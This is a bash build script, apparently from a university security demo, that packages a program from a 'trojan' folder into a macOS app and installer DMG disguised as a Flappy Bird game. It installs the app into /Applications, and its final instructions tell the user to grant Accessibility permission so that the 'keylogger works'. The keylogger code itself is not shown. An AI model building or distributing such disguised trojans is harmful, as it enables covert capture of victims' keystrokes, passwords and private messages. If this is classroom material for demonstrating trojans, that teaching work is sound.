#!/bin/bash
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PROJECT_DIR="$(dirname "$SCRIPT_DIR")"
cd "$PROJECT_DIR"

# Gera um bundle ID unico (macOS identifica permissoes por code hash + bundle ID)
BUNDLE_ID="com.ufpb.flappydemo.$(date +%s)"

echo "================================================"
echo "  Building FlappyDemo.app"
echo "  Bundle ID: $BUNDLE_ID"
echo "================================================"

# Mata processos anteriores e limpa
pkill -9 -f FlappyDemo 2>/dev/null
rm -rf /Applications/FlappyDemo.app
rm -f /tmp/flappybird_demo.lock /tmp/flappy_debug.log
sleep 1

source venv/bin/activate

# Gera icone se nao existir
if [ ! -f trojan/FlappyBird.icns ]; then
    python trojan/generate_icon.py
fi

# Limpa builds anteriores
rm -rf build dist *.spec

# Build (onedir para compatibilidade com macOS security)
pyinstaller \
    --windowed \
    --name "FlappyDemo" \
    --icon "trojan/FlappyBird.icns" \
    --osx-bundle-identifier "$BUNDLE_ID" \
    trojan/flappybird.py

# Instala em /Applications
echo ""
echo "[2/3] Instalando em /Applications..."
cp -R "$PROJECT_DIR/dist/FlappyDemo.app" /Applications/

# Gera DMG
echo "[3/3] Gerando .dmg..."

rm -f "$PROJECT_DIR/dist/FlappyDemo-Install.dmg"

create-dmg \
    --volname "Flappy Bird" \
    --volicon "trojan/FlappyBird.icns" \
    --window-pos 200 120 \
    --window-size 600 400 \
    --icon-size 100 \
    --icon "FlappyDemo.app" 150 185 \
    --app-drop-link 450 185 \
    --hide-extension "FlappyDemo.app" \
    "$PROJECT_DIR/dist/FlappyDemo-Install.dmg" \
    "$PROJECT_DIR/dist/FlappyDemo.app"

# Limpa temporarios
rm -rf build *.spec

# Remove marcador de primeiro uso (novo build = novo app)
rm -f /tmp/.flappydemo_setup_done

echo ""
echo "================================================"
echo "  DONE!"
echo "  .app: dist/FlappyDemo.app  (also in /Applications)"
echo "  .dmg: dist/FlappyDemo-Install.dmg"
echo ""
echo "  1. Open FlappyDemo from Applications"
echo "  2. Grant Accessibility in System Settings"
echo "  3. Quit and reopen - keylogger works"
echo "  Debug: cat /tmp/flappy_debug.log"
echo "================================================"
